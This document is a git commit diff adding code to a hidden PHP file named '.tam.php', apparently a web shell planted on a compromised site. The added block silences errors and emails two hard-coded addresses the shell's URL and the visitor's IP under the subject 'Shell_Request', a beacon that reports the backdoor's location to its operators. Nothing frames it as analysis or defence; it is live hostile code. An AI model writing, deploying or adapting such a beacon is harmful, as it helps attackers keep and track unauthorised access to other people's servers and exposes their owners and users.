64d7c75f58a12064a734416fca96c20bf19948cd
PreEdaetor <73938089+PreEdaetor@users.noreply.github.com>
2020-11-17 17:51:04 +0700

    Update .tam.php

--- .tam.php
+++ .tam.php
@@ -1,3 +1,15 @@
+
+<?php
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+set_time_limit(0);
+ini_set('memory_limit', '64M');
+header('Content-Type: text/html; charset=UTF-8');
+$tujuanmail = 'lambangwes@gmail.com, mrhorden007@gmail.com';
+$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
+mail($tujuanmail, "Shell_Request", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
+?>
 <?php
 error_reporting(0);
 set_time_limit(0);
